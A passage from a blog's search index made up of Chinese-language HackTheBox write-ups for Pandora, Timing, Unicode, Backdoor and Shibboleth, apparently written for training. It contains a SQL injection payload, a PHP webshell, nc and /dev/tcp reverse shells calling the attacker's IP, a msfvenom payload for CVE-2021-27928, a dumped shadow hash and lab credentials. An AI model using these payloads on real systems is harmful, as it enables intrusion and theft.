flag破解出来的密码就是karl的ssh密码，ssh登录得到user.txt: rust逆向 &amp; root flag可以sudo运行一个elf，查看strings可以知道是rust： 1scp karl@10.10.11.103://root/.auth/authenticator . 经过一系列逆向分析得到密码：RustForSecurity@Developer@2021:) (分析过程直接看0xdf文章和ippsec视频吧) 验证通过后可以写公钥： root flag然后ssh登录root，读取root.txt: 参考资料 https://github.com/studoot/ps2exe https://github.com/buuren/powershell/blob/master/misc/encryptPassword.ps1 EASILY UNLOCK Protected Excel Sheets WITHOUT Password - YouTubehttps://www.youtube.com/watch?v=2x23vZIRYRs&amp;ab_channel=LeilaGharani HackTheBox was vulnerable to reverse tabnabbing | 0xPrashant Bloghttps://blog.0xprashant.in/posts/htb-bug/ Remote Code Execution on a Facebook server – Sec Team Bloghttps://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/ HTB Developer [Discussion] | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-Developer-Discussion HTB: Developer | 0xdf hacks stuffhttps://0xdf.gitlab.io/2022/01/15/htb-developer.html https://www.hackthebox.com/home/machines/writeup/372 HackTheBox - Developer - YouTubehttps://www.youtube.com/watch?v=MjkDCy10BYM&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Pandora - HackTheBox","slug":"Pandora-HackTheBox","date":"2022-01-11T08:43:41.000Z","updated":"2022-05-23T06:46:41.714Z","comments":true,"path":"2022/01/11/Pandora-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/01/11/Pandora-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/423 10.10.11.136 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.11.136Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-11 10:33 CSTNmap scan report for 10.10.11.136Host is up (0.067s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)| 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)|_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Play | Landing|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 31.88 seconds 80 UDP端口扫描tcp的80没什么东西，尝试UDP扫描,发现161 snmp端口： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768$ sudo nmap -sU -sC -sV 10.10.11.136Password:Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-11 10:36 CSTNmap scan report for 10.10.11.136Host is up (0.079s latency).Not shown: 999 closed udp ports (port-unreach)Bug in snmp-win32-software: no string output.PORT STATE SERVICE VERSION161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public)| snmp-netstat:| TCP 0.0.0.0:22 0.0.0.0:0| TCP 10.10.11.136:22 10.10.14.9:63085| TCP 10.10.11.136:46700 1.1.1.1:53| TCP 127.0.0.1:3306 0.0.0.0:0| TCP 127.0.0.53:53 0.0.0.0:0| UDP 0.0.0.0:161 *:*|_ UDP 127.0.0.53:53 *:*| snmp-info:| enterprise: net-snmp| engineIDFormat: unknown| engineIDData: 48fa95537765c36000000000| snmpEngineBoots: 30|_ snmpEngineTime: 11h38m36s| snmp-interfaces:| lo| IP address: 127.0.0.1 Netmask: 255.0.0.0| Type: softwareLoopback Speed: 10 Mbps| VMware VMXNET3 Ethernet Controller| IP address: 10.10.11.136 Netmask: 255.255.254.0| MAC address: 00:50:56:b9:92:25 (VMware)|_ Type: ethernetCsmacd Speed: 4 Gbps| snmp-processes:| 1:| 2:| 3:| 4:| 6:| 9:| 10:| 11:| 12:| 13:| 14:| 15:| 16:| 17:| 18:| 20:| 21:| 22:| 23:| 24:| 25:| 26:| 27:| 28:| 29:| 30:| 77:| 78:| 79:|_ 80:| snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64|_ System uptime: 11h38m36.31s (4191631 timeticks)Service Info: Host: pandoraService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 1036.43 seconds SNMPsnmp枚举可以发现一组账号密码： https://github.com/dheiland-r7/snmp 123456perl snmpbw.pl 10.10.11.136 public 2 1perl snmpprs.pl 10.10.11.136.snmpsnmpwalk -v 2c -c public 10.10.11.136 1.3.6.1.2.1.25.4.2.1.5-u daniel -p HotelBabylon23 daniel得到的daniel登录ssh： 信息发现本地开着一个pandora_console： pandora_console转发出来访问,v7.0NG.742_FIX_PERL2020： 1ssh -L 8888:localhost:80 daniel@10.10.11.136 搜到两个漏洞： Pandora FMS 742: Critical Code Vulnerabilities Explainedhttps://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained TheCyberGeek/CVE-2020-5844https://github.com/TheCyberGeek/CVE-2020-5844 所以应该是两个结合利用，sql注入进后台，然后上传php webshell sql injection根据文章分析就是chart_generator.php中的session_id导致的，文章没给详细poc，可以直接暴力dump session表，其中得到结构信息，根据结构构造出admin的data，注入伪造admin： 12345678sqlmap -u http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php\\?session_id\\&#x3D;1 -v 3 -D pandora -T tsessions_php --dump| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:&quot;matt&quot;;alert_msg|a:0:&#123;&#125;new_chat|b:0; | 1638796349 |http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?session_id&#x3D;%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGOSELECT * FROM tsessions_php WHERE &#96;id_session&#96; &#x3D; &#39;&#39; union SELECT 1,2,&#39;id_usuario|s:5:&quot;admin&quot;;&#39; as data -- SgGO LIMIT 1 webshell admin有文件上传功能，上传webshell： reverse shell &amp; user flag1http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;pandora_console&#x2F;images&#x2F;shell.php?cmd&#x3D;rm%20&#x2F;tmp&#x2F;f;mkfifo%20&#x2F;tmp&#x2F;f;cat%20&#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh%20-i%202%3E%261|nc%2010.10.14.9%204444%20%3E&#x2F;tmp&#x2F;f 提权信息suid程序,内部调用tar，没有指定绝对路径: 提权 &amp; root flag首先写公钥到matt，ssh登录，后面操作的上下文都是在matt的ssh环境下： 123456789101112131415161718matt@pandora:/tmp$ mkdir nyamatt@pandora:/tmp$ cd nyamatt@pandora:/tmp/nya$ lsmatt@pandora:/tmp/nya$ echo \"/bin/sh\" &gt; tarmatt@pandora:/tmp/nya$ chmod +x ./tarmatt@pandora:/tmp/nya$ export PATH=$(pwd):$PATHmatt@pandora:/tmp/nya$ /usr/bin/pandora_backupPandoraFMS Backup UtilityNow attempting to backup PandoraFMS client# iduid=0(root) gid=1000(matt) groups=1000(matt)# cd /root# lsroot.txt# cat root.txtebb61c8c6de683f0d5c4778f2ee66826# cat /etc/shadowroot:$6$HM2preufywiCDqbY$XPrZFWf6w08MKkjghhCPBkxUo2Ag5xvZYOh4iD4XcN4zOVbWsdvqLYbznbUlLFxtC/.Z0oe9D6dT0cR7suhfr.:18794:0:99999:7::: 参考资料 https://github.com/dheiland-r7/snmp Pandora FMS 742: Critical Code Vulnerabilities Explainedhttps://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained TheCyberGeek/CVE-2020-5844https://github.com/TheCyberGeek/CVE-2020-5844 Pandora: HTB [Walkthrough]. Highlights | by d3xter | Jan, 2022 | Mediumhttps://medium.com/@d3xter/pandora-htb-walkthrough-e3b64569c39f","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Timing - HackTheBox","slug":"Timing-HackTheBox","date":"2021-12-23T08:52:51.000Z","updated":"2022-06-06T08:23:34.662Z","comments":true,"path":"2021/12/23/Timing-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/12/23/Timing-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/421 10.10.11.135 端口扫描22和80: 1234567891011121314151617181920212223$ nmap -sC -sV 10.10.11.135Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-23 14:06 CSTNmap scan report for 10.10.11.135Host is up (0.076s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)| 256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)|_ 256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set|_http-server-header: Apache/2.4.29 (Ubuntu)| http-title: Simple WebApp|_Requested resource was ./login.phpService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 30.47 seconds 80 目录扫描 扫描发现大部分都302到login，但有个image.php size是0，还有images目录，可能存在关联： 123456789101112131415gobuster dir -u http://10.10.11.135/ -w /usr/share/dirb/wordlists/common.txt -x php,html,txt -t 50/css (Status: 301) [Size: 310] [--&gt; http://10.10.11.135/css/]/footer.php (Status: 200) [Size: 3937]/header.php (Status: 302) [Size: 0] [--&gt; ./login.php]/images (Status: 301) [Size: 313] [--&gt; http://10.10.11.135/images/]/image.php (Status: 200) [Size: 0]/index.php (Status: 302) [Size: 0] [--&gt; ./login.php]/index.php (Status: 302) [Size: 0] [--&gt; ./login.php]/js (Status: 301) [Size: 309] [--&gt; http://10.10.11.135/js/]/login.php (Status: 200) [Size: 5609]/logout.php (Status: 302) [Size: 0] [--&gt; ./login.php]/profile.php (Status: 302) [Size: 0] [--&gt; ./login.php]/server-status (Status: 403) [Size: 277]/upload.php (Status: 302) [Size: 0] [--&gt; ./login.php] 继续扫images目录可以发现里面还有个uploads目录： 123gobuster dir -u http://10.10.11.135/images/ -w /usr/share/dirb/wordlists/common.txt -x php,html,txt -t 50/uploads (Status: 301) [Size: 321] [--&gt; http://10.10.11.135/images/uploads/] 所以猜测是upload.php上传的图片会存到这个文件夹，访问是通过image.php 参数fuzzfuzz出来img参数,发现对于路径存在过滤： 123456ffuf -u \"http://10.10.11.135/image.php?FUZZ=/etc/passwd\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0img [Status: 200, Size: 25, Words: 3, Lines: 1]➜ ~ curl http://10.10.11.135/image.php\\?img\\=/etc/passwdHacking attempt detected!% LFI基础的绕过，php伪协议： 后面就是读各种文件,知道需要role为1才能访问upload功能 upload.php123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpinclude(\"admin_auth_check.php\");$upload_dir = \"images/uploads/\";if (!file_exists($upload_dir)) &#123; mkdir($upload_dir, 0777, true);&#125;$file_hash = uniqid();$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES[\"fileToUpload\"][\"name\"]);$target_file = $upload_dir . $file_name;$error = \"\";$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));if (isset($_POST[\"submit\"])) &#123; $check = getimagesize($_FILES[\"fileToUpload\"][\"tmp_name\"]); if ($check === false) &#123; $error = \"Invalid file\"; &#125;&#125;// Check if file already existsif (file_exists($target_file)) &#123; $error = \"Sorry, file already exists.\";&#125;if ($imageFileType != \"jpg\") &#123; $error = \"This extension is not allowed.\";&#125;if (empty($error)) &#123; if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $target_file)) &#123; echo \"The file has been uploaded.\"; &#125; else &#123; echo \"Error: There was an error uploading your file.\"; &#125;&#125; else &#123; echo \"Error: \" . $error;&#125;?&gt; admin_auth_check.php1234567891011&lt;?phpinclude_once \"auth_check.php\";if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) &#123; echo \"No permission to access this panel!\"; header('Location: ./index.php'); die();&#125;?&gt; Adminrole使用/etc/passwd中获取的aaron作为用户名和密码登录，user id是2: update profile时添加参数role=1,提交后，可以发现页面多处Admin panel： 里面可以使用上传功能： upload注意前面upload，$file_hash实际上是兔子洞，因为使用的是单引号的字符串的$file_hash ，双引号才会使用变量内容，所以这里不是uniqid()生成的变量，所以这部分可以不用管，只需要知道文件名只和time有关就可以 What is the difference between single-quoted and double-quoted strings in PHP? - GeeksforGeekshttps://www.geeksforgeeks.org/what-is-the-difference-between-single-quoted-and-double-quoted-strings-in-php/ 另外虽然限制了只能上传jpg，但前面有LFI，所以可以上传里面是php代码的jpg，通过LFI去执行 webshell所以就是上传图片，根据响应时间找到对应hash，得到文件名，LFI执行代码： 12php -awhile (true)&#123;echo date(&quot;D M j G:i:s T Y&quot;); echo &quot; &#x3D; &quot; ; echo md5(&#39;$file_hash&#39; .time());echo &quot;\\n&quot;;sleep(1);&#125; 这个不能直接reverse shell，可能有防火墙 shell.jpg1&lt;?php system($_GET[cmd]);?&gt; backupopt目录可以发现一个source-files-backup.zip： 可以将其复制到images目录里，下载下来分析 123cp+&#x2F;opt&#x2F;source-files-backup.zip+&#x2F;var&#x2F;www&#x2F;html&#x2F;images&#x2F;uploads10.10.11.135&#x2F;images&#x2F;uploads&#x2F;source-files-backup.zip db_conngit log里可以发现更新过db_conn： git diff对比可以发现两个不同的密码： 123 &lt;?php-$pdo &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;app&#39;, &#39;root&#39;, &#39;4_V3Ry_l0000n9_p422w0rd&#39;);+$pdo &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;app&#39;, &#39;root&#39;, &#39;S3cr3t_unGu3ss4bl3_p422w0Rd&#39;); user flag老密码就是aaron用户ssh密码： 提权信息sudo可以运行netutils，实际上是一个jar包： 运行测试发现ftp模式使用wget下载文件，HTTP模式使用Axel/2.16.1下载文件，写到当前用户目录： 那如果创建一个软链接，写文件的时候就会写到软链接指向文件 提权 &amp; root flag所以可以直接写公钥进去，从而root登录： 参考资料 What is the difference between single-quoted and double-quoted strings in PHP? - GeeksforGeekshttps://www.geeksforgeeks.org/what-is-the-difference-between-single-quoted-and-double-quoted-strings-in-php/ HTB Timing Writeup | 0xDedinfosec Bloghttps://0xdedinfosec.vercel.app/posts/hackthebox-timing-writeup HTB Timing [Discussion] | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-Timing-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Unicode - HackTheBox","slug":"Unicode-HackTheBox","date":"2021-12-03T07:16:49.000Z","updated":"2022-05-09T04:28:51.814Z","comments":true,"path":"2021/12/03/Unicode-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/12/03/Unicode-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/415 10.10.11.126 端口扫描22,80: 12345678910111213141516171819$ nmap -sV -sC 10.10.11.126Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-03 13:09 CSTNmap scan report for 10.10.11.126Host is up (0.071s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)| 256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)|_ 256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Hackmedia|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-generator: Hugo 0.83.1Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 25.14 seconds 80 Hackmedia注册，登录： JWTcookie是JWT，解码发现使用jku： jwks.json123456789101112&#123; \"keys\": [ &#123; \"kty\": \"RSA\", \"use\": \"sig\", \"kid\": \"hackthebox\", \"alg\": \"RS256\", \"n\": \"AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs\", \"e\": \"AQAB\" &#125; ]&#125;% jku validation直接尝试自己生成公私钥修改JWT，jku直接使用自己的，会校验失败： mkjwk - JSON Web Key Generatorhttps://mkjwk.org/ redirect bypass返回主页，Google for us功能，这里任意跳转： http://10.10.11.126/redirect/?url=google.com 原本jku还有个static目录，这里也需要简单的绕过，最终结果： 1http:&#x2F;&#x2F;hackmedia.htb&#x2F;static&#x2F;..&#x2F;redirect&#x2F;?url&#x3D;10.10.14.3:7777&#x2F;jwks.json LFI查看报告，currentmonth那里加载pdf，可能存在LFI： 根据机器名称Unicode，可以搜索unicode相关漏洞： Unicode normalization vulnerabilities | Lazarhttps://lazarv.com/posts/unicode-normalization-vulnerabilities/ nginx默认配置文件得到db.yaml及web路径： 然后去读db.yaml，得到mysql密码： 1mysql_host: &quot;localhost&quot; mysql_user: &quot;code&quot; mysql_password: &quot;B3stC0d3r2021@@!&quot; mysql_db: &quot;user&quot; user flag得到的mysql密码就是code用户密码，ssh登录，user flag： 提权信息sudo发现treport，尝试运行根据报错信息treport.py，应该是python打包生成的，尝试解包： https://github.com/extremecoders-re/pyinstxtractor https://github.com/zrax/pycdc 1234567scp code@10.10.11.126:/usr/bin/treport .python3 pyinstxtractor/pyinstxtractor.py treport# pycdccmake CMakeLists.txtmake./pycdc treport.pyc 根据代码，download函数对命令注入有过滤，调用curl，可以尝试注入参数 treport.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import osimport sysfrom datetime import datetimeimport reclass threat_report: def create(self):Unsupported opcode: &lt;255&gt; file_name = input('Enter the filename:') content = input('Enter the report:') if '../' in file_name: print('NOT ALLOWED') sys.exit(0) file_path = '/root/reports/' + file_name # WARNING: Decompyle incomplete def list_files(self): file_list = os.listdir('/root/reports/') files_in_dir = ' '.join((lambda .0: [ str(elem) for elem in .0 ])(file_list)) print('ALL THE THREAT REPORTS:') print(files_in_dir) def read_file(self):Unsupported opcode: &lt;255&gt; file_name = input('\\nEnter the filename:') if '../' in file_name: print('NOT ALLOWED') sys.exit(0) contents = '' file_name = '/root/reports/' + file_name # WARNING: Decompyle incomplete def download(self): now = datetime.now() current_time = now.strftime('%H_%M_%S') command_injection_list = [ '$', '`', ';', '&amp;', '|', '||', '&gt;', '&lt;', '?', \"'\", '@', '#', '$', '%', '^', '(', ')'] ip = input('Enter the IP/file_name:') res = bool(re.search('\\\\s', ip)) if res: print('INVALID IP') sys.exit(0) if 'file' in ip and 'gopher' in ip or 'mysql' in ip: print('INVALID URL') sys.exit(0) cmd = '/bin/bash -c \"curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '\"' os.system(cmd) root flag1&#123;-K,&#x2F;root&#x2F;root.txt&#125; 参考资料 mkjwk - JSON Web Key Generatorhttps://mkjwk.org/ Unicode normalization vulnerabilities | Lazarhttps://lazarv.com/posts/unicode-normalization-vulnerabilities/ https://github.com/extremecoders-re/pyinstxtractor https://github.com/zrax/pycdc HTB Unicode [Discussion] | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-Unicode-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Backdoor - HackTheBox","slug":"Backdoor-HackTheBox","date":"2021-11-25T07:24:41.000Z","updated":"2022-04-24T06:36:03.752Z","comments":true,"path":"2021/11/25/Backdoor-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/11/25/Backdoor-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/416 10.10.11.125 端口扫描22,80: 12345678910111213141516171819 nmap -sV -sC 10.10.11.125Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-25 14:51 CSTNmap scan report for backdoor.htb (10.10.11.125)Host is up (0.071s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)| 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)|_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Backdoor &amp;#8211; Real-Life|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-generator: WordPress 5.8.1Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 27.45 seconds 80加hosts,wordpress: 110.10.11.125 backdoor.htb wordpresswpscan没什么东西，手动访问插件目录发现目录遍历，ebook-download 1.1版本： eBook Download搜到这个插件漏洞： WordPress Plugin eBook Download 1.1 - Directory Traversal - PHP webapps Exploithttps://www.exploit-db.com/exploits/39575 wp-config1234567define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );&#x2F;** MySQL database username *&#x2F;define( &#39;DB_USER&#39;, &#39;wordpressuser&#39; );&#x2F;** MySQL database password *&#x2F;define( &#39;DB_PASSWORD&#39;, &#39;MQYBJSaD#DxG6qbm&#39; ); procLfi enum,proc cmdline发现枚举到gdbserver在1337端口： gdbserver &amp; user flag根据这个： Turning arbitrary GDBserver sessions into RCE | Development &amp; Securityhttp://jbremer.org/turning-arbitrary-gdbserver-sessions-into-rce/ 也可以直接msf user flag 提权信息ps可以看到root screen session： 提权 &amp; root flag直接attach到root session： screen Cheat Sheet - Kapelihttps://kapeli.com/cheat_sheets/screen.docset/Contents/Resources/Documents/index 12export TERM=xtermscreen -x root/root 参考资料 WordPress Plugin eBook Download 1.1 - Directory Traversal - PHP webapps Exploithttps://www.exploit-db.com/exploits/39575 mthbernardes/LFI-Enum: Scripts to execute enumeration via LFIhttps://github.com/mthbernardes/LFI-Enum Turning arbitrary GDBserver sessions into RCE | Development &amp; Securityhttp://jbremer.org/turning-arbitrary-gdbserver-sessions-into-rce/ screen Cheat Sheet - Kapelihttps://kapeli.com/cheat_sheets/screen.docset/Contents/Resources/Documents/index HTB Backdoor [Discussion] | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-Backdoor-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Shibboleth - HackTheBox","slug":"Shibboleth-HackTheBox","date":"2021-11-18T05:51:09.000Z","updated":"2022-04-06T06:30:41.894Z","comments":true,"path":"2021/11/18/Shibboleth-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/11/18/Shibboleth-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/410 10.10.11.124 端口扫描只有80: 12345678910111213$ nmap -sV -sC 10.10.11.124Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-18 12:57 CSTNmap scan report for 10.10.11.124Host is up (0.070s latency).Not shown: 999 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.41|_http-title: Did not follow redirect to http://shibboleth.htb/|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: Host: shibboleth.htbService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 29.09 seconds 80ip访问跳转域名，添加hosts： 110.10.11.124 shibboleth.htb 页面底部， Powered by enterprise monitoring solutions based on Zabbix &amp; Bare Metal BMC automation vhosts可以发现几个子域名，其中有zabbix： 1234gobuster vhost -u http://shibboleth.htb/ -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -k -t 50 | grep 200Found: monitor.shibboleth.htb (Status: 200) [Size: 3686]Found: monitoring.shibboleth.htb (Status: 200) [Size: 3686]Found: zabbix.shibboleth.htb (Status: 200) [Size: 3686] zabbix.shibboleth.htb UDP端口udp扫描可以发现623端口： 12345678sudo nmap -sU -sV -F -v 10.10.11.124PORT STATE SERVICE VERSION623/udp open asf-rmcp1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port623-UDP:V=7.92%I=7%D=11/18%Time=6195DFD3%P=x86_64-apple-darwin20.4.SF:0%r(ipmi-rmcp,1E,\"\\x06\\0\\xff\\x07\\0\\0\\0\\0\\0\\0\\0\\0\\0\\x10\\x81\\x1cc\\x20\\x00SF:8\\0\\x01\\x97\\x04\\x03\\0\\0\\0\\0\\t\"); 搜索知道是IPMI 623/UDP/TCP - IPMI - HackTrickshttps://book.hacktricks.xyz/pentesting/623-udp-ipmi A Penetration Tester’s Guide to IPMI and BMCs | Rapid7 Bloghttps://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/ IMPI就是根据资料，一步步dump hash，破解密码： 1ilovepumkinpie1 (10.10.11.124 Administrator) zabbix得到的账号密码可以登录zabbix： shellzabbix管理hosts可以执行系统命令，Configuration —&gt; Hosts —&gt;Items -&gt; create item,使用system.run key： 1system.run[bash -c &#39;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.14.7&#x2F;4444 &lt;&amp;1&#39;,nowait] user flag用户密码就是zabbix管理员密码： 1ipmi-svc ilovepumkinpie1 提权信息zabbix配置文件得到数据库密码： 12345678910grep -iR 'password' /etc/zabbix/ 2&gt;/dev/null/etc/zabbix/zabbix_server.conf.dpkg-dist:### Option: DBPassword/etc/zabbix/zabbix_server.conf.dpkg-dist:# Database password./etc/zabbix/zabbix_server.conf.dpkg-dist:# Comment this line if no password is used./etc/zabbix/zabbix_server.conf.dpkg-dist:# DBPassword=/etc/zabbix/zabbix_server.conf:### Option: DBPassword/etc/zabbix/zabbix_server.conf:# Database password./etc/zabbix/zabbix_server.conf:# Comment this line if no password is used./etc/zabbix/zabbix_server.conf:DBPassword=bloooarskybluh 数据库版本mariadb 10.3.25，搜到相关漏洞： 1mysql -u zabbix -p -D zabbix CVE-2021-27928 : A remote code execution issue was discovered in MariaDB 10.2 before 10.2.37, 10.3 before 10.3.28, 10.4 before 10.4.18, ahttps://www.cvedetails.com/cve/CVE-2021-27928/ Al1ex/CVE-2021-27928: CVE-2021-27928 MariaDB/MySQL-‘wsrep provider’ 命令注入漏洞https://github.com/Al1ex/CVE-2021-27928 CVE-2021-2792812345678msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f elf-so -o CVE-2021-27928.sowget http://10.10.14.7:7777/CVE-2021-27928.somysql -u zabbix -p -D zabbixbloooarskybluhSET GLOBAL wsrep_provider=\"/tmp/CVE-2021-27928.so\"; 参考资料 623/UDP/TCP - IPMI - HackTrickshttps://book.hacktricks.xyz/pentesting/623-udp-ipmi A Penetration Tester’s Guide to IPMI and BMCs | Rapid7 Bloghttps://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/ CVE-2021-27928 : A remote code execution issue was discovered in MariaDB 10.2 before 10.2.37, 10.3 before 10.3.28, 10.4 before 10.4.18, ahttps://www.cvedetails.com/cve/CVE-2021-27928/ Al1ex/CVE-2021-27928: CVE-2021-27928 MariaDB/MySQL-‘wsrep provider’ 命令注入漏洞https://github.com/Al1ex/CVE-2021-27928 DISCUSSION - HTB Shibboleth | RaidForumshttps://raidforums.com/Thread-Tutorial-DISCUSSION-HTB-Shibboleth","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Secret - HackTheBox","slug":"Secret-HackTheBox","date":"2021-11-03T07:52:39.000Z","updated":"2022-03-28T07:05:58.710Z","comments":true,"path":"2021/11/03/Secret-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/11/03/Secret-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/408 10.10.11.120 端口扫描22,80,3000 1234567891011121314151617181920$ nmap -sV -sC 10.10.11.120Starting Nmap 7.92 ( 